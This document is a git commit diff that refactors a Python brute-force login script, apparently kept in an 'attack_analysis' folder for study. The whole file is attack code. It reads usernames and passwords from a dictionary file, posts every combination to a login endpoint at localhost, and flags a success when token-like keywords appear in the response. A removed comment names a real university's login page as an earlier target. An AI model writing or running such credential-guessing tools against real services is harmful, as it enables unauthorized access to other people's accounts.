96ab75a9640728e37ff77f113cafe6b94e852c4a
kacamata09 <muh.ansharazhari@gmail.com>
2023-09-28 15:25:06 +0700

    refactor: refactoring code bruteforce

--- attack_analysis/python/bruteforce.py
+++ attack_analysis/python/bruteforce.py
@@ -1,26 +1,36 @@
 import requests
 
 target_url = "http://localhost:1111/auth/login"
-# target_url = "https://stikomelrahma.ac.id/login"
 
 found = False
-username_payload = ['admin', 'admin123', 'anshar']
-password_payload = ['admin', '123', 'admin123']
-keyword_output = ['accessToken', 'token', 'access token', 'access']
+# username_payload = ['admin', 'admin123', 'anshar']
+# password_payload = ['admin', '123', 'admin123']
+keyword_output = []
 
-for u_payload in username_payload:
-    for p_payload in password_payload:
-        data = {
-            'username': u_payload,
-            'password': p_payload,  
-        }
+keyword_dictionary = input('File path keyword dictionary : ')
+with open(keyword_dictionary, 'r') as kwd:
+    keyword_output = [k.strip() for k in kwd]
 
-        response = requests.post(target_url, data=data)
-        # print(response.text)
-        if any(keyword in response.text for keyword in keyword_output):
-            print(f"Username logged use : {u_payload}")
-            print(f"Password logged use : {p_payload}")
-            found = True
-    
-if found == False:
-    print("Try again with others payloads")
+file_path = input('File path username and password dictionary txt : ')
+
+with open(file_path, 'r') as file:
+    dict_txt = [i.strip() for i in file]
+
+    for username in dict_txt:
+        username_payload = username
+        for password in dict_txt:
+            password_payload = password
+            data = {
+                'username': username_payload,
+                'password': password_payload,  
+            }
+
+            response = requests.post(target_url, data=data)
+            # print(response.text)
+            if any(keyword in response.text for keyword in keyword_output):
+                print(f"Username logged use : {username_payload}")
+                print(f"Password logged use : {password_payload}")
+                found = True
+        
+    if found == False:
+        print("Try again with others payloads")
